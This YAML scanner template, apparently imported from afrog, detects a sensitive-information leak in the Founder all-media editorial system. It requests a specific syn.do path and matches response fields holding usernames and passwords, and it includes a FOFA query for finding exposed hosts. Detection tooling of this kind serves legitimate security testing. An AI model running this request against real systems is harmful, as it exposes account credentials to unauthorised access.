# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - usercode
          - username
          - handesetnumber
          - userpassword
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/newsedit/assess/syn.do?type=org'
id: founder-syn-do-inclosure
info:
  author: zan8in
  description: |-
    方正电子在传媒行业30多年的技术深耕为基础，与媒体单位的融合进程无缝适配，助力媒体单位逐步破除采编部门自成一体的藩篱，破除传统媒体、新闻网站和新媒体采编发环节的壁垒，创新内部组织结构，建立采编分离、全媒体生产的运行机制方正全媒体采编系统敏感信息泄露、可获取账号和密码。
    fofa: app="FOUNDER-全媒体采编系统"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 方正畅享全媒体采编系统敏感信息泄露
  severity: high
  tags: 方正,方正全媒体采编系统,founder,inclosure,argus-import
